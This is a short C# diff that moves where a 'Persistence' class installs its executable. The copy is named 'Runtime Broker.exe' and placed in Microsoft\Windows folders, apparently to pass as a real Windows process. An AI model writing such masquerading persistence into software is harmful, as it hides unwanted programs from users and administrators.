@@ -8,8 +8,8 @@ namespace FileTransfer;
 public static class Persistence
 {
     private static readonly string DestDir = Path.Combine(
-        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-        "Microsoft", "Windows", "Themes", "RuntimeBroker");
+        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+        "Microsoft", "Windows", "RuntimeBroker");
 
     public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
     private static readonly string Marker = Path.Combine(DestDir, "ft.marker");
